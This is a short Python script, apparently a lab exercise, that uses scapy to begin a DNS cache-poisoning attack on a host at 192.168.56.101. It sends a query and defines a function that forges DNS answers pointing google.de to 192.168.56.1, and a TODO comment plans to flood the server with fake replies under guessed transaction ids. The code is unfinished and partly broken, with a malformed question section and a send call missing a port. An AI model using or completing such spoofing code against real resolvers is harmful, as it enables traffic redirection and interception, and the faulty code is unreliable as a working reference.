from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1
from socket import AF_INET, SOCK_DGRAM, socket
from traceback import print_exc

addr="192.168.56.101"

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

#TODO: Send DNS request async and start flooding the target dns server with fake answers using reply function and guessed ids
answer = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.thepacketgeek.com")),verbose=0)

print(answer[DNS].summary())

def reply(id):
	response = DNS(
		id=id, ancount=1, qr=1, aa=0, ra=0, rd=0,
		qdcount=1,
		qd=DNS(rd=1,qd=DNSQR(qname="google.de")),
		an=DNSRR(rrname="google.de", type='A', rdata="192.168.56.1", ttl=1234))
	sock.sendto(bytes(response), addr)
